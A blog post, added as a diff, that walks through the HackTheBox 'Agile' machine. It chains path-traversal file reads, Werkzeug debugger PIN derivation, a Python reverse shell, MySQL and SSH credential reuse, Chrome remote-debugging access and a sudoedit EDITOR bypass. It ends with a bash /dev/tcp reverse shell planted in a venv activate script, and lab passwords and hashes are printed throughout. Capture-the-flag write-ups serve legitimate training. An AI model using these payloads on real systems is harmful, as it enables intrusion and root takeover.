@@ -1,0 +1,341 @@
+---
+layout: post
+title:  "Writeup of Agile (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox agile LFI Werkzeug
+---
+
+# Discovery
+
+10.10.11.203 -> superpass.htb
+
+# LFI
+
+`GET /download?fn=../../etc/passwd`
+
+```
+root:x:0:0:root:/root:/bin/bash
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+...
+```
+
+`/proc/self/cmdline`
+
+```
+/app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
+```
+
+`/proc/self/environ`
+
+```
+LANG=C.UTF-8
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+HOME=/var/www
+LOGNAME=www-data
+USER=www-data
+INVOCATION_ID=57e96e6410ab4761aeb4ddd1bc9a4b82
+JOURNAL_STREAM=8:32954
+SYSTEMD_EXEC_PID=1099
+CONFIG_PATH=/app/config_prod.json
+```
+
+`/app/config_prod.json`
+
+```json
+{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
+```
+
+Password spray on known users (ssh) didn't work.
+
+# Error page is leaking data
+
+Sometimes we get this error randomly:
+
+```
+sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
+[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
+FROM users 
+WHERE users.username = %(username_1)s 
+ LIMIT %(param_1)s]
+[parameters: {'username_1': 'admin', 'param_1': 1}]
+```
+
+**An error can be forced by passing a non existent file to `GET /download?fn=`.**
+
+It leakes some locations:
+- `/app/venv/lib/python3.10/site-packages/flask/app.py`
+- `/app/app/superpass/views/vault_views.py`
+
+**To execute commands with the Werkzeug Debugger, we need a PIN.**
+
+# Getting the PIN
+
+`__version__ = "2.2.2"`
+
+We can leak `/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py` using the LFI.
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
+
+These values are needed to get the PIN:
+
+```py
+probably_public_bits = [
+    username,
+    modname,
+    getattr(app, '__name__', getattr(app.__class__, '__name__')),
+    getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    str(uuid.getnode()),
+    get_machine_id(),
+]
+```
+
+## private_bits
+
+`/proc/net/arp`
+
+```
+IP address       HW type     Flags       HW address            Mask     Device
+10.10.10.2       0x1         0x2         00:50:56:b9:93:5a     *        eth0
+```
+
+`/sys/class/net/eth0/address`
+
+```
+00:50:56:b9:c9:eb
+```
+
+```py
+>>> print(0x005056b9c9eb)
+345052400107
+```
+
+## get_machine_id() 
+
+- `/etc/machine-id: ed5b159560f54721827644bc9b220d00`
+- `/proc/sys/kernel/random/boot_id: 8dcacee1-c91d-4ea3-92b7-e3e9251743c6` - apparently not used anymore
+- `/proc/self/cgroup (needed part): superpass.service`
+
+So **get_machine_id()**: `ed5b159560f54721827644bc9b220d00superpass.service`
+
+## getattr(mod, '__file__', None)
+
+Leaked by the error page:
+
+`/app/venv/lib/python3.10/site-packages/flask/app.py`
+
+## other values
+
+- `username`: **www-data**
+- `modname`: **flask.app**
+- `getattr(app, '__name__', getattr (app .__ class__, '__name__'))`: **wsgi_app** -- needed to recreate the environment and debug print
+
+[generate.py](generate.py) generates the PIN.
+
+**PIN: 525-953-245**
+
+# Reverse shell as www-data
+
+After using the PIN:
+
+`import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.178",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`
+
+`id`
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+`mysql -u superpassuser`
+
+**superpassuser:dSA6l7q*yIVs$39Ml6ywvgK**
+
+There is a password:
+
+```
+agile:corum:5db7caa1d13cc37c9fc2
+```
+
+And hashes:
+
+```
+0xdf:$6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF.
+corum:$6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1
+```
+
+# SSH as corum
+
+**corum:5db7caa1d13cc37c9fc2** works for SSH!
+
+`user.txt: <redacted>`
+
+## pspy
+
+```
+2023/07/12 22:18:02 CMD: UID=0     PID=10937  | /usr/sbin/CRON -f -P 
+2023/07/12 22:18:02 CMD: UID=0     PID=10939  | /bin/bash -c /usr/bin/mysql superpasstest < /root/testdb.sql
+2023/07/12 22:18:02 CMD: UID=0     PID=10938  | cp -r /root/app / 
+2023/07/12 22:18:02 CMD: UID=0     PID=10943  | /bin/rm /tmp/attachments /tmp/b0 /tmp/completed ...
+2023/07/12 22:18:02 CMD: UID=1001  PID=10941  | /bin/bash /app/test_and_update.sh 
+2023/07/12 22:18:02 CMD: UID=1001  PID=10940  | /bin/sh -c /app/test_and_update.sh 
+2023/07/12 22:18:02 CMD: UID=1001  PID=10945  | /bin/bash /app/test_and_update.sh 
+
+2023/07/12 22:19:01 CMD: UID=1001  PID=10952  | date 
+2023/07/12 22:19:01 CMD: UID=1001  PID=10951  | /bin/bash /app/test_and_update.sh 
+2023/07/12 22:19:01 CMD: UID=1001  PID=10950  | /bin/sh -c /app/test_and_update.sh 
+2023/07/12 22:19:01 CMD: UID=1001  PID=10955  | grep -q pytest 
+2023/07/12 22:19:01 CMD: UID=1001  PID=10954  | grep -v grep 
+2023/07/12 22:19:01 CMD: UID=1001  PID=10953  | ps auxww 
+```
+
+`UID 1001` is **runner: :1001:1001::/app/app-testing/:/bin/sh**
+
+Let's check out this dev version. It's on port **:5555**.
+
+```
+ssh> -L 5555:127.0.0.1:5555
+Forwarding port.
+```
+
+The dev version has these lines added:
+
+```py
+if not fn.endswith('.csv'):
+        flask.abort(403)
+```
+
+So the previous LFI doesn't work.
+
+However this function seems to be vulnerable to **file write**:
+
+```py
+def generate_csv(user):
+    rand = get_random(10)
+    fn = f'{user.username}_export_{rand}.csv'
+    path = f'/tmp/{fn}'
+    
+    # ...
+
+    with open(path, 'w') as f:
+        writer = csv.writer(f)
+        writer.writerow(header)
+        writer.writerows((p.get_dict().values() for p in passwords))
+```
+
+Previously it wouldn't pass this check:
+
+```py
+if len([c for c in username if c not in string.ascii_letters + string.digits]) > 0:
+```
+
+We could bypass this check if we had creds for the test database.
+
+# Interactive testing
+
+There is a file `test_site_interactively.py` - it loads `creds.txt` and run headless chrome.
+
+`--remote-debugging-port=41829`
+
+We can forward port `:41829` and [connect to it](https://chromedevtools.github.io/devtools-protocol/).
+
+`http://localhost:41829/json`
+
+```json
+[ {
+   "description": "",
+   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:41829/devtools/page/B1E08518F25F81E2F2989FCFC5239CE6",
+   "id": "B1E08518F25F81E2F2989FCFC5239CE6",
+   "title": "SuperPassword 🦸",
+   "type": "page",
+   "url": "http://test.superpass.htb/",
+   "webSocketDebuggerUrl": "ws://localhost:41829/devtools/page/B1E08518F25F81E2F2989FCFC5239CE6"
+} ]
+```
+
+`http://localhost:9222/devtools/inspector.html?ws=localhost:9222/devtools/page/FA9969EF87352313B99368A478D00B9B`
+
+It's an interactive view of the page. There are two passwords:
+
+```
+edwards:d07867c6267dcb5df0af
+dedwards__:7dbfe676b6b564ce5718
+```
+
+# SSH as edwards
+
+**edwards:d07867c6267dcb5df0af** works for SSH!
+
+`sudo -l`
+
+```
+Matching Defaults entries for edwards on agile:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+```
+
+`sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`
+
+```
+edwards:1d7ffjwrx#$d6qn!9nndqgde4
+```
+
+`sudoedit -u dev_admin /app/config_test.json`
+
+```json
+{
+    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
+}
+```
+
+`mysql superpasstest -u superpasstester -p`
+
+**superpasstester:VUO8A2c2#3FnLq3*a9DX1U**
+
+# Exploiting :5555
+
+Now we can go back to the file write vulnerability.
+Let's try adding a user (password: `test`):
+
+`INSERT INTO users VALUES (3, '../../../dev/shm/test', '$6$rounds=200000$6301fmUwf0sQJ5oP$owepxqT7fnUz8a3uHlQnD99.uSEA/MvCgj7guT9qdLjqhSXIF0.mWJh9z3GTTtbWerCbV7zei1.4jyfil81Eq0');`
+
+After logging in and clicking "Export" `/dev/shm/test_export_50bd687f55.csv` is created by `runner`!
+
+# File write as dev_admin
+
+https://www.exploit-db.com/exploits/51217
+
+We can edit almost any file as dev_admin using:
+
+`EDITOR="vim -- /home/dev_admin/.bashrc" sudoedit -u dev_admin /app/config_test.json`
+
+# Escalation to root
+
+`find / -group dev_admin 2>/dev/null`
+
+```
+/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh
+```
+
+`EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config_test.json`
+
+Add to the top: `bash -c 'bash -i >& /dev/tcp/10.10.14.178/9001 0>&1'`
+
+After a while we get a reverse shell as **root**.
+
+`root.txt: <redacted>`
